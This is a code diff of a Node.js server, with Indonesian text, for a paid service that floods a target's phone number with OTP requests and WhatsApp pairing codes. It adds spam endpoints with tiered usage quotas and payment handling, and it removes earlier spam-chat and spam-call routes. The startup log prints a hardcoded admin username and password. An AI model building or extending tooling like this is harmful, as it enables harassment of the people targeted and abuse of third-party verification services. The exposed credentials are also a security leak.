+                isReseller: user.isReseller
             }
         });
     } catch (err) {
@@ -592,26 +1167,184 @@ app.post('/api/change-password', (req, res) => {
     }
 });
 
-// ===== BOT ROUTES =====
-app.get('/api/bots', (req, res) => {
+// ===== SPAM OTP =====
+app.post('/api/spam/otp', async (req, res) => {
     try {
-        const bots = db.bots.map(b => ({
-            id: b.id,
-            number: b.number,
-            owner: b.owner,
-            status: botStatus[b.id] || b.status || 'disconnected',
-            pairingCode: b.pairingCode || null,
-            method: b.method || 'qris',
-            isReady: (botStatus[b.id] === 'ready')
-        }));
-        res.json({ success: true, bots });
+        const { username, target, count } = req.body;
+        
+        if (!username) {
+            return res.json({ success: false, message: 'Username tidak ditemukan!' });
+        }
+        
+        const user = db.users.find(u => u.username === username);
+        if (!user) {
+            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
+        }
+        
+        // CEK MAINTENANCE
+        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
+            return res.json({ 
+                success: false, 
+                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan. Silakan coba lagi nanti.',
+                maintenance: true
+            });
+        }
+        
+        if (!target) {
+            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
+        }
+        
+        if (!count || count < 1) {
+            return res.json({ success: false, message: 'Jumlah minimal 1!' });
+        }
+        
+        // CEK LIMIT
+        const limits = {
+            'Free': 15,
+            'Premium': 80,
+            'VIP': 150,
+            'Reseller': 200,
+            'Developer': Infinity
+        };
+        
+        const maxLimit = limits[user.status] || 15;
+        
+        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
+            if (count > maxLimit) {
+                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
+            }
+            
+            const remaining = user.limit - (user.used || 0);
+            if (remaining <= 0) {
+                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
+            }
+            if (count > remaining) {
+                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
+            }
+        }
+
+        // Jalankan spam OTP
+        const sessionId = `otp_${username}_${Date.now()}`;
+        const result = await spamOTP(target, count, username, sessionId);
+        
+        // Update used
+        if (result.success > 0) {
+            user.used = (user.used || 0) + result.success;
+            saveDB();
+            io.emit('userUpdated', { username: user.username });
+        }
+        
+        res.json({ 
+            success: true, 
+            result: {
+                success: result.success,
+                failed: result.failed,
+                total: result.success + result.failed,
+                details: result.details
+            }
+        });
     } catch (err) {
-        res.json({ success: false, bots: [] });
+        console.error('❌ Error spam OTP:', err);
+        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
     }
 });
 
-// ===== CONNECT BOT - PERBAIKAN CEPAT =====
-app.post('/api/bots/connect', async (req, res) => {
+// ===== SPAM PAIRING =====
+app.post('/api/spam/pairing', async (req, res) => {
+    try {
+        const { username, target, count, useBot } = req.body;
+        
+        if (!username) {
+            return res.json({ success: false, message: 'Username tidak ditemukan!' });
+        }
+        
+        const user = db.users.find(u => u.username === username);
+        if (!user) {
+            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
+        }
+        
+        // CEK MAINTENANCE
+        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
+            return res.json({ 
+                success: false, 
+                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan. Silakan coba lagi nanti.',
+                maintenance: true
+            });
+        }
+        
+        if (!target) {
+            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
+        }
+        
+        if (!count || count < 1) {
+            return res.json({ success: false, message: 'Jumlah minimal 1!' });
+        }
+        
+        // CEK LIMIT
+        const limits = {
+            'Free': 15,
+            'Premium': 80,
+            'VIP': 150,
+            'Reseller': 200,
+            'Developer': Infinity
+        };
+        
+        const maxLimit = limits[user.status] || 15;
+        
+        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
+            if (count > maxLimit) {
+                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
+            }
+            
+            const remaining = user.limit - (user.used || 0);
+            if (remaining <= 0) {
+                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
+            }
+            if (count > remaining) {
+                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
+            }
+        }
+
+        let result;
+        const sessionId = `pairing_${username}_${Date.now()}`;
+        
+        if (useBot === true) {
+            // Cari bot yang ready
+            let botId = null;
+            for (const [id, status] of Object.entries(botStatus)) {
+                if (status === 'ready') {
+                    botId = id;
+                    break;
+                }
+            }
+            
+            if (botId && activeSockets[botId]) {
+                const sock = activeSockets[botId];
+                result = await spamPairingCode(sock, target, count, sessionId);
+            } else {
+                // Fallback tanpa bot
+                result = await spamPairingWithoutBot(target, count, sessionId);
+            }
+        } else {
+            result = await spamPairingWithoutBot(target, count, sessionId);
+        }
+        
+        // Update used
+        if (result.success > 0) {
+            user.used = (user.used || 0) + result.success;
+            saveDB();
+            io.emit('userUpdated', { username: user.username });
+        }
+        
+        res.json({ success: true, result });
+    } catch (err) {
+        console.error('❌ Error spam pairing:', err);
+        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
+    }
+});
+
+// ===== CONNECT BOT (HANYA UNTUK PAIRING CODE) =====
+app.post('/api/bot/connect', async (req, res) => {
     try {
         const { number, username, method } = req.body;
         
@@ -623,9 +1356,18 @@ app.post('/api/bots/connect', async (req, res) => {
         if (!user) {
             return res.json({ success: false, message: 'User tidak ditemukan!' });
         }
+        
+        // CEK MAINTENANCE
+        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
+            return res.json({ 
+                success: false, 
+                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
+                maintenance: true
+            });
+        }
 
         // Cek bot existing
-        const existing = db.bots.find(b => b.number === number && b.owner === username);
+        const existing = db.bots?.find(b => b.number === number && b.owner === username);
         if (existing) {
             if (fs.existsSync(`${AUTH_DIR}/${existing.id}/creds.json`)) {
                 if (botStatus[existing.id] === 'ready') {
@@ -648,17 +1390,22 @@ app.post('/api/bots/connect', async (req, res) => {
                     });
                 } catch (e) {
                     fs.removeSync(`${AUTH_DIR}/${existing.id}`);
+                    if (db.bots) {
+                        db.bots = db.bots.filter(b => b.id !== existing.id);
+                        saveDB();
+                    }
+                }
+            } else {
+                if (db.bots) {
                     db.bots = db.bots.filter(b => b.id !== existing.id);
                     saveDB();
                 }
-            } else {
-                db.bots = db.bots.filter(b => b.id !== existing.id);
-                saveDB();
             }
         }
 
         // Buat bot baru
         const sessionId = `${number}_${Date.now()}`;
+        if (!db.bots) db.bots = [];
         db.bots.push({
             id: sessionId,
             number: number,
@@ -677,7 +1424,6 @@ app.post('/api/bots/connect', async (req, res) => {
         
         botStatus[sessionId] = 'connecting';
 
-        // Kirim response cepat
         res.json({
             success: true,
             message: 'Bot sedang menghubungkan...',
@@ -691,7 +1437,7 @@ app.post('/api/bots/connect', async (req, res) => {
 });
 
 // ===== DISCONNECT BOT =====
-app.post('/api/bots/disconnect', async (req, res) => {
+app.post('/api/bot/disconnect', async (req, res) => {
     try {
         const { sessionId } = req.body;
         
@@ -708,8 +1454,10 @@ app.post('/api/bots/disconnect', async (req, res) => {
             delete botReconnectTimers[sessionId];
         }
         
-        db.bots = db.bots.filter(b => b.id !== sessionId);
-        saveDB();
+        if (db.bots) {
+            db.bots = db.bots.filter(b => b.id !== sessionId);
+            saveDB();
+        }
         try { fs.removeSync(`${AUTH_DIR}/${sessionId}`); } catch (e) {}
         
         res.json({ success: true });
@@ -718,160 +1466,21 @@ app.post('/api/bots/disconnect', async (req, res) => {
     }
 });
 
-// ===== SPAM PAIRING =====
-app.post('/api/spam/pairing', async (req, res) => {
+// ===== GET BOTS =====
+app.get('/api/bots', (req, res) => {
     try {
-        const { sessionId, target, count, useBot, username } = req.body;
-        
-        if (!target) {
-            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
-        }
-        if (!count || count < 1) {
-            return res.json({ success: false, message: 'Jumlah minimal 1!' });
-        }
-        if (count > 15) {
-            return res.json({ success: false, message: 'Jumlah maksimal 15!' });
-        }
-        
-        // Cari user
-        let user = null;
-        
-        // Coba dari bot
-        if (sessionId && !sessionId.startsWith('spam_')) {
-            const bot = db.bots.find(b => b.id === sessionId);
-            if (bot) {
-                user = db.users.find(u => u.username === bot.owner);
-            }
-        }
-        
-        // Coba dari sessionId format spam_
-        if (!user && sessionId && sessionId.startsWith('spam_')) {
-            const parts = sessionId.split('_');
-            if (parts.length >= 2) {
-                user = db.users.find(u => u.username === parts[1]);
-            }
-        }
-        
-        // Coba dari username yang dikirim
-        if (!user && username) {
-            user = db.users.find(u => u.username === username);
-        }
-        
-        if (!user) {
-            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
-        }
-        
-        // Cek limit
-        const limit = user.limit;
-        if (limit !== Infinity && limit !== '∞' && limit !== null) {
-            const remaining = limit - (user.used || 0);
-            if (remaining <= 0) {
-                return res.json({ success: false, message: 'Limit spam habis! Hubungi admin.' });
-            }
-            if (count > remaining) {
-                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
-            }
-        }
-
-        let result;
-        const useExistingBot = useBot === true && sessionId && !sessionId.startsWith('spam_') && activeSockets[sessionId] && botStatus[sessionId] === 'ready';
-        
-        if (useExistingBot) {
-            const sock = activeSockets[sessionId];
-            console.log(`🔹 Spam dengan bot ${sessionId}`);
-            result = await spamPairingCode(sock, target, count, sessionId);
-        } else {
-            console.log(`🔹 Spam tanpa bot untuk ${user.username}`);
-            const tempSessionId = `spam_${user.username}_${Date.now()}`;
-            result = await spamPairingWithoutBot(target, count, tempSessionId);
-        }
-        
-        if (result.success > 0) {
-            user.used = (user.used || 0) + result.success;
-            saveDB();
-            io.emit('userUpdated', { username: user.username });
-        }
-        
-        res.json({ success: true, result });
+        const bots = (db.bots || []).map(b => ({
+            id: b.id,
+            number: b.number,
+            owner: b.owner,
+            status: botStatus[b.id] || b.status || 'disconnected',
+            pairingCode: b.pairingCode || null,
+            method: b.method || 'qris',
+            isReady: (botStatus[b.id] === 'ready')
+        }));
+        res.json({ success: true, bots });
     } catch (err) {
-        console.error('❌ Error spam pairing:', err);
-        res.json({ success: false, message: err.message });
-    }
-});
-
-// ===== SPAM CHAT =====
-app.post('/api/spam/chat', async (req, res) => {
-    try {
-        const { sessionId, target, message, count } = req.body;
-        
-        const bot = db.bots.find(b => b.id === sessionId);
-        if (!bot) return res.json({ success: false, message: 'Session tidak ditemukan!' });
-        
-        const user = db.users.find(u => u.username === bot.owner);
-        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
-        
-        const limit = user.limit;
-        if (limit !== Infinity && limit !== '∞' && limit !== null) {
-            const remaining = limit - (user.used || 0);
-            if (remaining <= 0) {
-                return res.json({ success: false, message: 'Limit spam habis!' });
-            }
-            if (count > remaining) {
-                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
-            }
-        }
-        
-        const sock = activeSockets[sessionId];
-        if (!sock) return res.json({ success: false, message: 'Bot tidak ditemukan!' });
-        if (botStatus[sessionId] !== 'ready') return res.json({ success: false, message: 'Bot belum siap!' });
-        
-        const result = await spamChat(sock, target, message, count, sessionId);
-        if (result.success > 0) {
-            user.used = (user.used || 0) + result.success;
-            saveDB();
-            io.emit('userUpdated', { username: user.username });
-        }
-        res.json({ success: true, result });
-    } catch (err) {
-        res.json({ success: false, message: err.message });
-    }
-});
-
-// ===== SPAM CALL =====
-app.post('/api/spam/call', async (req, res) => {
-    try {
-        const { sessionId, target, type, count } = req.body;
-        
-        const bot = db.bots.find(b => b.id === sessionId);
-        if (!bot) return res.json({ success: false, message: 'Session tidak ditemukan!' });
-        
-        const user = db.users.find(u => u.username === bot.owner);
-        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
-        
-        const limit = user.limit;
-        if (limit !== Infinity && limit !== '∞' && limit !== null) {
-            const remaining = limit - (user.used || 0);
-            if (remaining <= 0) {
-                return res.json({ success: false, message: 'Limit spam habis!' });
-            }
-            if (count > remaining) {
-                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
-            }
-        }
-        
-        const sock = activeSockets[sessionId];
-        if (!sock) return res.json({ success: false, message: 'Bot tidak ditemukan!' });
-        if (botStatus[sessionId] !== 'ready') return res.json({ success: false, message: 'Bot belum siap!' });
-        
-        const result = await spamCall(sock, target, type, count, sessionId);
-        if (result.success > 0) {
-            user.used = (user.used || 0) + result.success;
-            saveDB();
-            io.emit('userUpdated', { username: user.username });
-        }
-        res.json({ success: true, result });
-    } catch (err) {
-        res.json({ success: false, message: err.message });
+        res.json({ success: false, bots: [] });
     }
 });
 
@@ -889,7 +1498,8 @@ app.get('/api/admin/users', (req, res) => {
                 used: u.used,
                 online: u.online || false,
                 isAdmin: u.isAdmin,
-                isDeveloper: u.isDeveloper
+                isDeveloper: u.isDeveloper,
+                isReseller: u.isReseller
             }))
         });
     } catch (err) {
@@ -901,17 +1511,26 @@ app.post('/api/admin/update-status', (req, res) => {
     try {
         const { username, status, admin } = req.body;
         const adminUser = db.users.find(u => u.username === admin);
-        if (!adminUser || (!adminUser.isAdmin && !adminUser.isDeveloper)) {
-            return res.json({ success: false, message: 'Unauthorized!' });
-        }
-        if (status === 'Developer' && !adminUser.isDeveloper) {
+        if (!adminUser || !adminUser.isDeveloper) {
             return res.json({ success: false, message: 'Hanya Developer!' });
         }
         const user = db.users.find(u => u.username === username);
         if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
-        const limits = { Free: 15, Premium: 200, VIP: Infinity, Reseller: 500, Developer: Infinity };
+        
+        const limits = { 
+            'Free': 15, 
+            'Premium': 80, 
+            'VIP': 150, 
+            'Reseller': 200, 
+            'Developer': Infinity 
+        };
+        
         user.status = status;
         user.limit = limits[status] || 15;
+        user.used = 0;
+        user.isReseller = (status === 'Reseller');
+        user.isAdmin = (status === 'Developer');
+        user.isDeveloper = (status === 'Developer');
         saveDB();
         io.emit('userUpdated', { username, action: 'status_change' });
         res.json({ success: true });
@@ -928,7 +1547,9 @@ app.post('/api/admin/ban', (req, res) => {
             return res.json({ success: false, message: 'Hanya Developer!' });
         }
         db.users = db.users.filter(u => u.username !== username);
-        db.bots = db.bots.filter(b => b.owner !== username);
+        if (db.bots) {
+            db.bots = db.bots.filter(b => b.owner !== username);
+        }
         saveDB();
         io.emit('userUpdated', { username, action: 'banned' });
         res.json({ success: true });
@@ -946,6 +1567,7 @@ app.post('/api/admin/settings', (req, res) => {
         }
         db.settings = settings;
         saveDB();
+        io.emit('settingsUpdated', { settings });
         res.json({ success: true });
     } catch (err) {
         res.json({ success: false, message: err.message });
@@ -954,7 +1576,7 @@ app.post('/api/admin/settings', (req, res) => {
 
 app.get('/api/admin/payments', (req, res) => {
     try {
-        res.json({ success: true, payments: db.payments });
+        res.json({ success: true, payments: db.payments || [] });
     } catch (err) {
         res.json({ success: false, payments: [] });
     }
@@ -972,9 +1594,11 @@ app.post('/api/admin/verify-payment', (req, res) => {
         payment.status = 'verified';
         const user = db.users.find(u => u.username === payment.username);
         if (user) {
-            const limits = { Premium: 200, VIP: Infinity, Reseller: 500 };
+            const limits = { Premium: 80, VIP: 150, Reseller: 200 };
             user.status = payment.package;
             user.limit = limits[payment.package] || 15;
+            user.used = 0;
+            user.isReseller = (payment.package === 'Reseller');
         }
         saveDB();
         io.emit('paymentStatus', { status: 'success', message: `Pembayaran ${payment.package} diverifikasi!` });
@@ -1017,6 +1641,7 @@ app.post('/api/payments/submit', upload.single('proof'), (req, res) => {
         const user = db.users.find(u => u.username === username);
         if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
         if (!req.file) return res.json({ success: false, message: 'Upload bukti pembayaran!' });
+        if (!db.payments) db.payments = [];
         db.payments.push({
             id: uuidv4(),
             username,
@@ -1054,6 +1679,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('sendMessage', (data) => {
+        if (!db.messages) db.messages = [];
         db.messages.push(data);
         if (db.messages.length > 1000) db.messages.shift();
         saveDB();
@@ -1065,16 +1691,25 @@ io.on('connection', (socket) => {
     });
 });
 
-// ===== AUTO CLEAN =====
-function checkAndCleanMessages() {
-    const now = new Date();
-    if (now.getHours() === 23 && now.getMinutes() === 59) {
-        db.messages = [];
-        saveDB();
-        console.log('🧹 Pesan chat dibersihkan');
-    }
-}
-setInterval(checkAndCleanMessages, 60000);
+// ===== RESET LIMIT SETIAP 1 JAM =====
+setInterval(() => {
+    const now = Date.now();
+    db.users.forEach(user => {
+        if (user.limit !== Infinity && user.limit !== '∞') {
+            if (user.lastReset && (now - user.lastReset) >= 3600000) {
+                user.used = 0;
+                user.lastReset = now;
+                console.log(`🔄 Reset limit untuk ${user.username}`);
+            }
+            if (!user.lastReset) {
+                user.lastReset = now;
+                user.used = 0;
+            }
+        }
+    });
+    saveDB();
+    io.emit('usersUpdated', {});
+}, 60000);
 
 // ============================================
 // START SERVER
@@ -1082,13 +1717,23 @@ setInterval(checkAndCleanMessages, 60000);
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`🔗 https://your-app.railway.app`);
-    console.log('📱 WhatsApp Bot siap digunakan!');
-    console.log('========================================');
-    console.log('🔄 Restoring saved sessions...');
-    await restoreAllBots();
     console.log('========================================');
     console.log('👑 Admin: Lynzka / Asiafone11');
-    console.log('💡 Developer limit: ∞ (Unlimited)');
+    console.log('📱 SPAM OTP & PAIRING READY!');
+    console.log('========================================');
+    console.log('🔥 45+ API OTP Services');
+    console.log('========================================');
+    console.log('📊 Limit per status:');
+    console.log('   Free     : 15x');
+    console.log('   Premium  : 80x');
+    console.log('   VIP      : 150x');
+    console.log('   Reseller : 200x');
+    console.log('   Developer: Unlimited');
+    console.log('========================================');
+    console.log('⏰ Reset limit setiap 1 jam');
+    console.log('========================================');
+    console.log('🔄 Restoring bot sessions...');
+    await restoreAllBots();
+    console.log('✅ All done!');
     console.log('========================================');
 });
